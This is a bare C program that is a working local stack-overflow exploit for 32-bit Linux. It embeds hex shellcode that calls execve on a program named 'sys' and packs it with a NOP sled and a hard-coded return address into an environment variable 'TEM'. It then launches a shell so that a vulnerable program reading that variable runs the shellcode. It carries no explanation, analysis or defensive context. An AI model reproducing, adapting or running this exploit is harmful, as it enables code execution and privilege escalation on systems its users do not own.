#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>

char ShellCode[] = "\xeb\x18\x5e\x31\xc0\x88\x46\x03\x89\x46\x04\x89\x46\x08\xb0\x0b\x89\xf3\x8d\x4e\x04\x8d\x56\x08\xcd\x80\xe8\xe3\xff\xff\xff\x73\x79\x73\x41\x42\x42\x42\x42\x43\x43\x43\x43";

char retaddr[] = "\x74\x83\xff\xff";

#define NOP 0x90

void main()
{
	char buffer[500];
	memset(buffer,NOP,500);
	memcpy(buffer,"TEM=",4);
	memcpy(buffer+4,ShellCode,43);
	memcpy(buffer+492,retaddr,4);
	memcpy(buffer+496,"\x00\x00\x00\x00",4);
	putenv(buffer);
	system("/bin/sh");
	return ;
}
